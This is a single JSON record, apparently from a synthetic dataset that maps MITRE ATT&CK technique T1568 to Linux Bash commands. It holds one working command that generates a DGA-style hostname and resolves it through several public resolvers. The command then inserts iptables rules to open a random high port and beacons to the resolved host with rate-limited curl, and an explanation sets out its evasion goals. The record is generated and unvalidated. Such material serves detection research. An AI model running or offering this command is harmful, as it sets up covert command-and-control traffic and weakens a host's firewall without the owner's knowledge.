{
  "technique_id": "T1568",
  "platform": "Linux",
  "shell": "Bash",
  "command": "bash -c 'd=$(printf \"api-%s.syncgate.io\" \"$(date -u +%H%M | sha1sum | cut -c1-4)\"); for r in 1.1.1.1 9.9.9.9 8.8.8.8; do ip=$(dig +short @\"$r\" \"$d\" | head -n1); [ -n \"$ip\" ] && break; done; if [ -n \"$ip\" ]; then port=$(shuf -i 30000-61000 -n1); iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -m statistic --mode random --probability 0.5 -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS --limit-rate $((RANDOM%50+10))k \"http://$d:$port/b\"; fi'",
  "explanation": "Resolves a DGA domain using multiple public resolvers, then uses iptables with probabilistic acceptance to create irregular traffic patterns and communicates over a high port.",
  "rationale_steps": [
    "Generate a short-lived DGA hostname",
    "Query several resolvers to obtain an IP",
    "Randomize the destination port",
    "Add iptables rules with random acceptance to vary patterns",
    "Perform low-bandwidth beaconing using curl"
  ],
  "obfuscation_level": "none",
  "id": "SYN-BASH-T1568-10f87baa-8aed3034",
  "source_prompt_hash": "10f87baa",
  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
  "validation": {
    "syntax_ok": null,
    "llm_judge": null,
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}